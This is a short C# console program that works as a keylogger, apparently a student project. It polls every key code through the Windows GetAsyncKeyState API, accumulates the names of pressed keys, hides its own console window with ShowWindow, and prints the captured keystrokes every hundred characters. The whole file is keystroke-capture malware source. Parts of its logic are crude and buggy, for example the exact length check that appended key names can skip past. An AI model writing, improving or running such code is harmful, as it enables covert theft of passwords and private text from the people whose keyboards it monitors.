using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.IO;

namespace ProjektiKonzola
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);



        static void Main(string[] args)
        {
           
           
                Start();
            
            
        }
        static void Start()
        {

            int hwnd = FindWindow(Console.Title, "");
            int brojac = 1;
            string log="";
            
            while (true)
            {
                Thread.Sleep(10);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        log +=(Keys)i;                       
                        break;
                    }
                }
                if(log.Length<100)
                {
                    ShowWindow(hwnd, 1);
                }else
                {
                    ShowWindow(hwnd, 0);
                }
                if (log.Length == 100)
                {
                    Console.WriteLine("{0,10 }",log);
                    Console.WriteLine("{0}. praćenje tipkovnice",brojac);
                    log = "";
                    brojac++;
                }
                
            }



        }
    }
}
